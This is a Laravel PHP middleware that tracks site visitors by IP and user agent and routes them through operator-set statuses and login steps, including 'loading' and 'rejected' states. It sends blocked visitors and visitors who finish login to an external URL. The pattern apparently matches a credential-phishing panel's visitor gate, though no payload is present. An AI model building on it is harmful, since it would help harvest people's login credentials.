<?php

namespace App\Http\Middleware;

use App\Connection\Status;
use App\Connection\Step;
use App\Models\Connection;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class VerifySession
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        /** @var Connection|null $connection */
        $connection = null;

        if ($key = $request->session()->get('connection')) {
            rescue(function () use ($key, &$connection) {
                $decrypted = Crypt::decryptString($key);
                $connection = Connection::query()->findOrFail($decrypted);
                $connection->update(['last_seen_at' => now()]);
            }, report: false);
        }

        if (! $connection) {
            /** @var Connection $connection */
            $connection = Connection::create([
                'ip' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]);

            $encrypted = Crypt::encryptString($connection->getKey());
            $request->session()->put('connection', $encrypted);
        }

        $request->merge(['connection' => $connection]);

        if ($connection->status->is(Status::Blocked)) {
            if ($url = config('app.redirect_url')) {
                return redirect()->away($url);
            }

            Log::warning('No redirect URL provided!', [
                'status' => $connection->status->getLabel(),
                'connection' => $connection->getKey(),
            ]);

            abort(403, 'Access denied.');
        }

        if ($connection->status->is(Status::Pending) && ! $request->routeIs('verify')) {
            return redirect()->route('verify');
        }

        if ($connection->status->is(Status::Allowed)) {
            if ($request->query('token') && $request->session()->get('token') == $request->query('token')) {
                $request->session()->forget('token');

                if ($request->routeIs('login')) {
                    $connection->update(['step' => Step::Login]);
                    return redirect()->route('login');
                }

                //
                else if ($request->routeIs('support')) {
                    $connection->update(['step' => Step::Support]);
                    return redirect()->route('support');
                }
            }

            //
            else if ($connection->step->is(Step::LoginSuccessful)) {
                if ($url = config('app.redirect_url')) {
                    return redirect()->away($url);
                }

                Log::warning('No redirect URL provided!', [
                    'connection' => $connection->getKey(),
                    'step' => $connection->step->getLabel(),
                ]);
            }

            //
            else if ($connection->step->is(Step::Login, Step::LoginLoading, Step::LoginRejected) && ! $request->routeIs('login')) {
                return redirect()->route('login');
            }

            //
            else if ($connection->step->is(Step::Support) && ! $request->routeIs('support')) {
                return redirect()->route('support');
            }
        }

        return $next($request);
    }
}
